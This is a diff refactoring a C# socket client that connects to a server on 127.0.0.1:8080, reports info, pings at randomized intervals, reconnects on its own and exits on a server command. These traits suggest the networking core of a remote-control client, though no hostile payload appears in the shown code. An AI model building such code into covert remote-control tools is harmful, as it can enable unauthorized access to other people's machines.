@@ -21,14 +21,14 @@ namespace Client
 {
     class Settings
     {
-        public static string IP = "127.0.0.1";
-        public static int Port = 8080;
-        public static string Version = "0.2";
+        public static readonly string IP = "127.0.0.1";
+        public static readonly int Port = 8080;
+        public static readonly string Version = "0.2";
     }
 
     class Program
     {
-        public static Socket client { get; set; }
+        public static Socket Client { get; set; }
         public static byte[] Buffer { get; set; }
         public static long Buffersize { get; set; }
         public static bool BufferRecevied { get; set; }
@@ -48,21 +48,23 @@ namespace Client
         {
             try
             {
-                client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                client.ReceiveBufferSize = 50 * 1024;
-                client.SendBufferSize = 50 * 1024;
-                client.ReceiveTimeout = -1;
-                client.SendTimeout = -1;
-                client.Connect(Settings.IP, Settings.Port);
+                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                {
+                ReceiveBufferSize = 50 * 1024,
+                SendBufferSize = 50 * 1024,
+                ReceiveTimeout = -1,
+                SendTimeout = -1,
+                };
+                Client.Connect(Settings.IP, Settings.Port);
                 Debug.WriteLine("Connected!");
                 Buffer = new byte[1];
                 Buffersize = 0;
                 BufferRecevied = false;
                 MS = new MemoryStream();
                 BeginSend(SendInfo());
-                TimerCallback T = new TimerCallback(Ping);
+                TimerCallback T = Ping;
                 Tick = new System.Threading.Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
-                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+                Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
             {
@@ -74,23 +76,15 @@ namespace Client
 
         public static void Reconnect()
         {
-            if (client.Connected == false)
+            if (Client.Connected) return;
+            if (Client.Connected == false)
             {
-                if (Tick != null)
-                {
-                    Tick.Dispose();
-                }
+                Tick?.Dispose();
 
-                if (client != null)
-                {
-                    client.Close();
-                    client.Dispose();
-                }
+                Client?.Close();
+                Client?.Dispose();
 
-                if (MS != null)
-                {
-                    MS.Dispose();
-                }
+                MS?.Dispose();
 
                 InitializeClient();
             }
@@ -109,12 +103,12 @@ namespace Client
         {
             try
             {
-                if (client.Connected == false)
+                if (Client.Connected == false)
                 {
                     Reconnect();
                 }
 
-                int Recevied = client.EndReceive(ar);
+                int Recevied = Client.EndReceive(ar);
 
                 if (Recevied > 0)
                 {
@@ -156,7 +150,7 @@ namespace Client
                 {
                     Reconnect();
                 }
-                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+                Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
             {
@@ -194,7 +188,7 @@ namespace Client
                     {
                         try
                         {
-                            client.Shutdown(SocketShutdown.Both);
+                            Client.Shutdown(SocketShutdown.Both);
                         }
                         catch { }
                         Environment.Exit(0);
@@ -213,7 +207,7 @@ namespace Client
 
         public static void BeginSend(byte[] Msgs)
         {
-            if (client.Connected)
+            if (Client.Connected)
             {
                 try
                 {
@@ -224,8 +218,8 @@ namespace Client
                         MS.Write(buffersize, 0, buffersize.Length);
                         MS.Write(buffer, 0, buffer.Length);
 
-                        client.Poll(-1, SelectMode.SelectWrite);
-                        client.BeginSend(MS.ToArray(), 0, Convert.ToInt32(MS.Length), SocketFlags.None, new AsyncCallback(EndSend), null);
+                        Client.Poll(-1, SelectMode.SelectWrite);
+                        Client.BeginSend(MS.ToArray(), 0, Convert.ToInt32(MS.Length), SocketFlags.None, new AsyncCallback(EndSend), null);
                     }
                 }
                 catch
@@ -239,7 +233,7 @@ namespace Client
         {
             try
             {
-                client.EndSend(ar);
+                Client.EndSend(ar);
             }
             catch
             {
